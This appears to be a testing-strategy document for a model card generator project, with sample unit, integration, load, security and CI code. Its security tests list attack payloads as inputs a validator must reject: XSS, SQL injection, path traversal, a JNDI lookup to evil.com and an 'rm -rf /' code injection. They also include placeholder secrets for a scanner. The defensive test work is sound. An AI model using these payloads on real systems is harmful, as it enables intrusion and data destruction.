# Comprehensive Testing Strategy

This document outlines the multi-layered testing approach for the Model Card Generator project.

## Testing Philosophy

Our testing strategy follows the **Test Pyramid** principle with emphasis on:
- **Fast feedback loops** for developers
- **Comprehensive coverage** across all system layers  
- **Quality gates** that prevent regressions
- **Performance validation** for production readiness

## Testing Levels

### 1. Unit Testing

**Coverage Target**: 90%+  
**Execution Time**: < 30 seconds  
**Framework**: pytest with fixtures

#### Structure

```
tests/unit/
├── test_core/
│   ├── test_generator.py
│   ├── test_validators.py
│   └── test_templates.py
├── test_integrations/
│   ├── test_wandb.py
│   ├── test_mlflow.py
│   └── test_huggingface.py
└── test_utils/
    ├── test_helpers.py
    └── test_formatters.py
```

#### Example Unit Test

```python
# tests/unit/test_core/test_generator.py
import pytest
from unittest.mock import Mock, patch
from modelcard_generator import ModelCardGenerator, CardConfig

class TestModelCardGenerator:
    """Test suite for ModelCardGenerator core functionality."""
    
    @pytest.fixture
    def config(self):
        """Standard test configuration."""
        return CardConfig(
            format="huggingface",
            include_ethical_considerations=True,
            regulatory_standard="eu_ai_act"
        )
    
    @pytest.fixture
    def generator(self, config):
        """ModelCardGenerator instance with test config."""
        return ModelCardGenerator(config)
    
    def test_generator_initialization(self, generator, config):
        """Test generator initializes with correct configuration."""
        assert generator.config == config
        assert generator.format == "huggingface"
        assert generator.templates is not None
    
    @patch('modelcard_generator.core.TemplateEngine')
    def test_generate_from_results(self, mock_template, generator):
        """Test card generation from evaluation results."""
        # Arrange
        mock_results = {
            "accuracy": 0.95,
            "f1_score": 0.92,
            "model_name": "test-model"
        }
        mock_template.return_value.render.return_value = "# Test Model Card"
        
        # Act
        card = generator.generate(eval_results=mock_results)
        
        # Assert
        assert card is not None
        assert "Test Model Card" in str(card)
        mock_template.return_value.render.assert_called_once()
    
    @pytest.mark.parametrize("format_type,expected_sections", [
        ("huggingface", ["model_details", "uses", "training_data"]),
        ("google", ["model_details", "quantitative_analysis", "considerations"]),
        ("eu_cra", ["intended_purpose", "risk_assessment", "technical_robustness"])
    ])
    def test_format_specific_sections(self, format_type, expected_sections):
        """Test that different formats include required sections."""
        config = CardConfig(format=format_type)
        generator = ModelCardGenerator(config)
        
        card = generator.generate(eval_results={"accuracy": 0.9})
        
        for section in expected_sections:
            assert hasattr(card, section)
```

#### Test Configuration

```ini
# pytest.ini extensions
[tool.pytest.ini_options]
minversion = "7.0"
addopts = [
    "-ra",
    "--strict-markers",
    "--strict-config",
    "--cov=modelcard_generator",
    "--cov-report=term-missing:skip-covered",
    "--cov-report=html:htmlcov",
    "--cov-report=xml:coverage.xml",
    "--cov-fail-under=90",
    "--durations=10",
    "--tb=short"
]
testpaths = ["tests"]
markers = [
    "unit: Unit tests (fast, isolated)",
    "integration: Integration tests (slower, external deps)", 
    "e2e: End-to-end tests (slowest, full system)",
    "performance: Performance benchmarking tests",
    "security: Security-focused tests",
    "smoke: Quick validation tests",
    "slow: Tests that take > 5 seconds",
    "network: Tests requiring network access",
    "gpu: Tests requiring GPU resources",
    "docker: Tests requiring Docker"
]
filterwarnings = [
    "error",
    "ignore::UserWarning",
    "ignore::DeprecationWarning",
    "ignore::PendingDeprecationWarning"
]
```

### 2. Integration Testing

**Purpose**: Validate component interactions  
**Execution Time**: < 5 minutes  
**Framework**: pytest + docker-compose

#### Test Environment Setup

```yaml
# tests/integration/docker-compose.test.yml
version: '3.8'
services:
  test-postgres:
    image: postgres:15-alpine
    environment:
      POSTGRES_DB: modelcard_test
      POSTGRES_USER: test
      POSTGRES_PASSWORD: test
    ports:
      - "5433:5432"
    
  test-redis:
    image: redis:7-alpine
    ports:
      - "6380:6379"
    
  test-minio:
    image: minio/minio:latest
    command: server /data --console-address ":9001"
    environment:
      MINIO_ACCESS_KEY: minioadmin
      MINIO_SECRET_KEY: minioadmin
    ports:
      - "9001:9000"
      - "9002:9001"
```

#### Integration Test Example

```python
# tests/integration/test_cli_integration.py
import pytest
import tempfile
import json
from pathlib import Path
from click.testing import CliRunner
from modelcard_generator.cli import main

class TestCLIIntegration:
    """Integration tests for CLI functionality."""
    
    @pytest.fixture
    def runner(self):
        """Click test runner."""
        return CliRunner()
    
    @pytest.fixture
    def sample_eval_data(self):
        """Sample evaluation data for testing."""
        return {
            "accuracy": 0.95,
            "precision": 0.93,
            "recall": 0.97,
            "f1_score": 0.95,
            "model_name": "sentiment-classifier-v2",
            "dataset": "imdb_reviews",
            "timestamp": "2024-01-15T10:30:00Z"
        }
    
    def test_generate_command_with_eval_results(self, runner, sample_eval_data):
        """Test card generation via CLI with evaluation results."""
        with tempfile.TemporaryDirectory() as tmpdir:
            # Create test input file
            eval_file = Path(tmpdir) / "eval_results.json"
            eval_file.write_text(json.dumps(sample_eval_data))
            
            output_file = Path(tmpdir) / "MODEL_CARD.md"
            
            # Execute CLI command
            result = runner.invoke(main, [
                'generate',
                str(eval_file),
                '--format', 'huggingface',
                '--output', str(output_file)
            ])
            
            # Verify success
            assert result.exit_code == 0
            assert output_file.exists()
            
            # Verify content
            content = output_file.read_text()
            assert "sentiment-classifier-v2" in content
            assert "accuracy: 0.95" in content
            assert "# Model Card" in content
    
    @pytest.mark.docker
    def test_full_pipeline_with_mlflow(self, runner):
        """Test complete pipeline with MLflow integration."""
        # This test requires MLflow server running in Docker
        result = runner.invoke(main, [
            'generate',
            '--mlflow-run', 'test-experiment/run-123',
            '--format', 'google',
            '--compliance', 'gdpr',
            '--output', 'test_card.json'
        ])
        
        assert result.exit_code == 0
        assert "test_card.json" in result.output
```

### 3. End-to-End Testing

**Purpose**: Validate complete user workflows  
**Execution Time**: < 15 minutes  
**Framework**: pytest + playwright/selenium

#### E2E Test Structure

```python
# tests/e2e/test_user_workflows.py
import pytest
from playwright.sync_api import Page, expect

class TestUserWorkflows:
    """End-to-end tests for user workflows."""
    
    @pytest.fixture(autouse=True)
    def setup_test_data(self, page: Page):
        """Set up test data before each test."""
        # Upload test model and results
        page.goto("/admin/test-setup")
        page.click("button[data-testid='create-test-data']")
        expect(page.locator("[data-testid='setup-complete']")).to_be_visible()
    
    def test_complete_model_card_creation_workflow(self, page: Page):
        """Test complete workflow from data upload to card export."""
        # Step 1: Navigate to card generator
        page.goto("/generate")
        expect(page.locator("h1")).to_contain_text("Generate Model Card")
        
        # Step 2: Upload evaluation results
        page.set_input_files(
            "input[type='file'][name='eval-results']", 
            "tests/fixtures/sample_eval.json"
        )
        
        # Step 3: Select format and options
        page.select_option("select[name='format']", "huggingface")
        page.check("input[name='include-ethical-considerations']")
        page.select_option("select[name='compliance-standard']", "eu-ai-act")
        
        # Step 4: Generate card
        page.click("button[data-testid='generate-card']")
        expect(page.locator("[data-testid='generation-status']")).to_contain_text("Generating...")
        expect(page.locator("[data-testid='card-preview']")).to_be_visible(timeout=30000)
        
        # Step 5: Validate generated content
        card_content = page.locator("[data-testid='card-content']").inner_text()
        assert "Model Details" in card_content
        assert "Ethical Considerations" in card_content
        assert "EU AI Act Compliance" in card_content
        
        # Step 6: Export card
        page.click("button[data-testid='export-markdown']")
        with page.expect_download() as download_info:
            page.click("button[data-testid='download-card']")
        download = download_info.value
        assert download.suggested_filename.endswith(".md")
        
        # Step 7: Validate exported file
        download_path = Path("test_downloads") / download.suggested_filename
        download.save_as(download_path)
        
        exported_content = download_path.read_text()
        assert "# Model Card" in exported_content
        assert "accuracy: 0.95" in exported_content
```

### 4. Performance Testing

**Purpose**: Validate system performance under load  
**Framework**: pytest-benchmark + locust

#### Benchmark Tests

```python
# tests/performance/test_benchmarks.py
import pytest
from modelcard_generator import ModelCardGenerator, CardConfig

class TestPerformanceBenchmarks:
    """Performance benchmark tests."""
    
    @pytest.fixture
    def large_eval_data(self):
        """Large evaluation dataset for performance testing."""
        return {
            "metrics": {f"metric_{i}": 0.5 + (i * 0.01) for i in range(1000)},
            "confusion_matrix": [[100, 10], [5, 95]] * 100,
            "feature_importance": {f"feature_{i}": 0.1 for i in range(500)}
        }
    
    def test_card_generation_performance(self, benchmark, large_eval_data):
        """Benchmark card generation with large dataset."""
        config = CardConfig(format="huggingface")
        generator = ModelCardGenerator(config)
        
        result = benchmark(generator.generate, eval_results=large_eval_data)
        
        assert result is not None
        # Benchmark should complete in < 2 seconds for large dataset
        assert benchmark.stats['mean'] < 2.0
    
    @pytest.mark.parametrize("format_type", ["huggingface", "google", "eu_cra"])
    def test_format_rendering_performance(self, benchmark, format_type):
        """Benchmark rendering performance across formats."""
        config = CardConfig(format=format_type)
        generator = ModelCardGenerator(config)
        
        eval_data = {"accuracy": 0.95, "model_name": "test-model"}
        
        result = benchmark(generator.generate, eval_results=eval_data)
        
        assert result is not None
        # All formats should render in < 100ms for simple data
        assert benchmark.stats['mean'] < 0.1
```

#### Load Testing

```python
# tests/performance/locustfile.py
from locust import HttpUser, task, between
import json
import random

class ModelCardGeneratorUser(HttpUser):
    """Simulated user for load testing."""
    
    wait_time = between(1, 3)
    
    def on_start(self):
        """Set up test data for each user."""
        self.eval_data = {
            "accuracy": random.uniform(0.8, 0.99),
            "f1_score": random.uniform(0.8, 0.95),
            "model_name": f"test-model-{random.randint(1000, 9999)}"
        }
    
    @task(3)
    def generate_huggingface_card(self):
        """Generate Hugging Face format card."""
        response = self.client.post("/api/v1/generate", json={
            "eval_results": self.eval_data,
            "format": "huggingface",
            "include_ethical_considerations": True
        })
        assert response.status_code == 200
    
    @task(2)
    def generate_google_card(self):
        """Generate Google format card."""
        response = self.client.post("/api/v1/generate", json={
            "eval_results": self.eval_data,
            "format": "google",
            "include_quantitative_analysis": True
        })
        assert response.status_code == 200
    
    @task(1)
    def validate_existing_card(self):
        """Validate existing card."""
        card_content = "# Model Card\n## Model Details\n..."
        response = self.client.post("/api/v1/validate", json={
            "card_content": card_content,
            "standard": "huggingface"
        })
        assert response.status_code == 200
    
    @task(1)
    def health_check(self):
        """Health check endpoint."""
        response = self.client.get("/health")
        assert response.status_code == 200
```

### 5. Security Testing

**Purpose**: Validate security controls and identify vulnerabilities  
**Framework**: pytest + bandit + safety

#### Security Test Examples

```python
# tests/security/test_security.py
import pytest
import tempfile
import os
from pathlib import Path
from modelcard_generator.security import InputValidator, SecretScanner

class TestInputSecurity:
    """Security tests for input validation."""
    
    @pytest.fixture
    def validator(self):
        """Input validator instance."""
        return InputValidator()
    
    @pytest.mark.parametrize("malicious_input", [
        "<script>alert('xss')</script>",
        "'; DROP TABLE cards; --",
        "../../../etc/passwd",
        "${jndi:ldap://evil.com/exploit}",
        "{{7*7}}",  # Template injection
        "__import__('os').system('rm -rf /')"  # Code injection
    ])
    def test_malicious_input_detection(self, validator, malicious_input):
        """Test detection of malicious inputs."""
        is_safe = validator.validate_string(malicious_input)
        assert not is_safe, f"Failed to detect malicious input: {malicious_input}"
    
    def test_file_upload_security(self, validator):
        """Test file upload security validation."""
        with tempfile.NamedTemporaryFile(suffix=".exe", delete=False) as f:
            f.write(b"MZ\x90\x00")  # PE header
            exe_path = f.name
        
        try:
            is_safe = validator.validate_file(exe_path)
            assert not is_safe, "Executable file upload should be rejected"
        finally:
            os.unlink(exe_path)
    
    def test_json_bomb_detection(self, validator):
        """Test detection of JSON bombs (deeply nested objects)."""
        # Create deeply nested JSON (potential DoS)
        nested_dict = {}
        current = nested_dict
        for i in range(1000):
            current['level'] = {}
            current = current['level']
        
        is_safe = validator.validate_json_structure(nested_dict)
        assert not is_safe, "JSON bomb should be detected"

class TestSecretScanning:
    """Security tests for secret detection."""
    
    @pytest.fixture
    def scanner(self):
        """Secret scanner instance."""
        return SecretScanner()
    
    @pytest.mark.parametrize("secret_type,secret_value", [
        ("aws_access_key", "AKIAIOSFODNN7EXAMPLE"),
        ("github_token", "ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"),
        ("api_key", "sk-1234567890abcdef1234567890abcdef"),
        ("private_key", "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEF"),
        ("password", "password=admin123"),
        ("jwt_token", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c")
    ])
    def test_secret_detection(self, scanner, secret_type, secret_value):
        """Test detection of various secret types."""
        test_content = f"API configuration: {secret_value}"
        
        secrets_found = scanner.scan_content(test_content)
        assert len(secrets_found) > 0, f"Failed to detect {secret_type}"
        assert secrets_found[0]['type'] == secret_type
```

### 6. Contract Testing

**Purpose**: Ensure API compatibility between services  
**Framework**: pact-python

```python
# tests/contract/test_api_contract.py
import pytest
from pact import Consumer, Provider
from modelcard_generator.client import ModelCardClient

pact = Consumer('modelcard-frontend')\
    .has_pact_with(Provider('modelcard-api'))

class TestAPIContract:
    """Contract tests for API compatibility."""
    
    def test_generate_card_contract(self):
        """Test contract for card generation endpoint."""
        expected_request = {
            "eval_results": {"accuracy": 0.95},
            "format": "huggingface"
        }
        
        expected_response = {
            "card_id": "12345",
            "content": "# Model Card\n...",
            "format": "huggingface",
            "created_at": "2024-01-15T10:30:00Z"
        }
        
        (pact
         .given('a valid model exists')
         .upon_receiving('a request to generate card')
         .with_request('POST', '/api/v1/generate', 
                      headers={'Content-Type': 'application/json'},
                      body=expected_request)
         .will_respond_with(200, 
                           headers={'Content-Type': 'application/json'},
                           body=expected_response))
        
        with pact:
            client = ModelCardClient('http://localhost:1234')
            result = client.generate_card(
                eval_results={"accuracy": 0.95},
                format="huggingface"
            )
            
            assert result['card_id'] == "12345"
            assert "Model Card" in result['content']
```

## Testing Infrastructure

### 1. Test Data Management

```python
# tests/fixtures/data_factory.py
import factory
from factory import Faker
from datetime import datetime

class EvaluationResultsFactory(factory.Factory):
    """Factory for generating test evaluation results."""
    
    class Meta:
        model = dict
    
    accuracy = factory.Faker('pyfloat', min_value=0.7, max_value=0.99, right_digits=3)
    precision = factory.Faker('pyfloat', min_value=0.7, max_value=0.99, right_digits=3)
    recall = factory.Faker('pyfloat', min_value=0.7, max_value=0.99, right_digits=3)
    f1_score = factory.LazyAttribute(lambda obj: 2 * (obj.precision * obj.recall) / (obj.precision + obj.recall))
    model_name = factory.Faker('word')
    dataset = factory.Faker('word')
    timestamp = factory.Faker('date_time_this_year')

class ModelCardFactory(factory.Factory):
    """Factory for generating test model cards."""
    
    class Meta:
        model = dict
    
    model_details = factory.SubFactory(factory.DictFactory, {
        'name': factory.Faker('word'),
        'version': factory.Faker('pystr', min_chars=5, max_chars=10),
        'license': 'apache-2.0'
    })
    
    performance = factory.SubFactory(EvaluationResultsFactory)
    
    ethical_considerations = factory.List([
        factory.Faker('sentence') for _ in range(3)
    ])
```

### 2. Test Environment Management

```bash
#!/bin/bash
# scripts/test-env-setup.sh

set -e

echo "🔧 Setting up test environment..."

# Start test infrastructure
docker-compose -f tests/docker-compose.test.yml up -d

# Wait for services to be ready
echo "⏳ Waiting for services..."
./scripts/wait-for-services.sh

# Run database migrations
echo "🗄️ Setting up test database..."
pytest tests/conftest.py::setup_test_database

# Load test data
echo "📊 Loading test data..."
python tests/fixtures/load_test_data.py

# Verify environment
echo "✅ Verifying test environment..."
pytest tests/smoke/ -v

echo "🎉 Test environment ready!"
```

### 3. Continuous Testing Pipeline

```yaml
# .github/workflows/testing.yml
name: Comprehensive Testing

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: [3.9, 3.10, 3.11, 3.12]
    
    steps:
    - uses: actions/checkout@v4
    - name: Set up Python ${{ matrix.python-version }}
      uses: actions/setup-python@v4
      with:
        python-version: ${{ matrix.python-version }}
    
    - name: Install dependencies
      run: |
        pip install -e ".[test]"
    
    - name: Run unit tests
      run: |
        pytest tests/unit/ -v --cov=modelcard_generator \
          --cov-report=xml --cov-report=term-missing
    
    - name: Upload coverage
      uses: codecov/codecov-action@v3
      with:
        file: ./coverage.xml
  
  integration-tests:
    runs-on: ubuntu-latest
    needs: unit-tests
    
    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_PASSWORD: postgres
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    
    steps:
    - uses: actions/checkout@v4
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.11'
    
    - name: Run integration tests
      run: |
        pytest tests/integration/ -v --timeout=300
  
  security-tests:
    runs-on: ubuntu-latest
    needs: unit-tests
    
    steps:
    - uses: actions/checkout@v4
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.11'
    
    - name: Install security tools
      run: |
        pip install bandit[toml] safety
    
    - name: Run security tests
      run: |
        pytest tests/security/ -v
        bandit -r src/ -f json -o bandit-report.json
        safety check --json --output safety-report.json
  
  performance-tests:
    runs-on: ubuntu-latest
    needs: integration-tests
    
    steps:
    - uses: actions/checkout@v4
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.11'
    
    - name: Run performance tests
      run: |
        pytest tests/performance/ -v --benchmark-json=benchmark.json
    
    - name: Store benchmark results
      uses: benchmark-action/github-action-benchmark@v1
      with:
        tool: 'pytest'
        output-file-path: benchmark.json
        github-token: ${{ secrets.GITHUB_TOKEN }}
        auto-push: true
  
  e2e-tests:
    runs-on: ubuntu-latest
    needs: integration-tests
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    
    steps:
    - uses: actions/checkout@v4
    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.11'
    
    - name: Install Playwright
      run: |
        pip install playwright pytest-playwright
        playwright install
    
    - name: Run E2E tests
      run: |
        pytest tests/e2e/ -v --headed --video=on --screenshot=on
    
    - name: Upload test artifacts
      uses: actions/upload-artifact@v3
      if: failure()
      with:
        name: e2e-test-results
        path: |
          test-results/
          playwright-report/
```

## Quality Gates

### 1. Pre-commit Quality Gates

```yaml
# .pre-commit-config.yaml additions
repos:
  - repo: local
    hooks:
      - id: test-coverage-check
        name: Test Coverage Check
        entry: pytest --cov=modelcard_generator --cov-fail-under=90 tests/unit/
        language: system
        pass_filenames: false
        
      - id: performance-regression-check
        name: Performance Regression Check
        entry: pytest tests/performance/ --benchmark-compare-fail=mean:10%
        language: system
        pass_filenames: false
```

### 2. CI/CD Quality Gates

```bash
#!/bin/bash
# scripts/quality-gate.sh

set -e

echo "🚪 Running quality gates..."

# Gate 1: Unit test coverage
echo "📊 Checking test coverage..."
COVERAGE=$(pytest --cov=modelcard_generator --cov-report=term-missing tests/unit/ | grep TOTAL | awk '{print $4}' | sed 's/%//')
if (( $(echo "$COVERAGE < 90" | bc -l) )); then
    echo "❌ Test coverage too low: ${COVERAGE}% (required: 90%)"
    exit 1
fi
echo "✅ Test coverage: ${COVERAGE}%"

# Gate 2: Performance benchmarks
echo "⚡ Checking performance benchmarks..."
pytest tests/performance/ --benchmark-compare-fail=mean:10%
echo "✅ Performance benchmarks passed"

# Gate 3: Security scans
echo "🔒 Running security scans..."
bandit -r src/ -ll -f json -o bandit-report.json
SECURITY_ISSUES=$(jq '.results | length' bandit-report.json)
if (( SECURITY_ISSUES > 0 )); then
    echo "❌ Security issues found: $SECURITY_ISSUES"
    jq '.results' bandit-report.json
    exit 1
fi
echo "✅ No security issues found"

# Gate 4: Integration tests
echo "🔗 Running integration tests..."
pytest tests/integration/ -v
echo "✅ Integration tests passed"

echo "🎉 All quality gates passed!"
```

This comprehensive testing strategy ensures high-quality, reliable, and secure software delivery with multiple layers of validation and continuous feedback loops.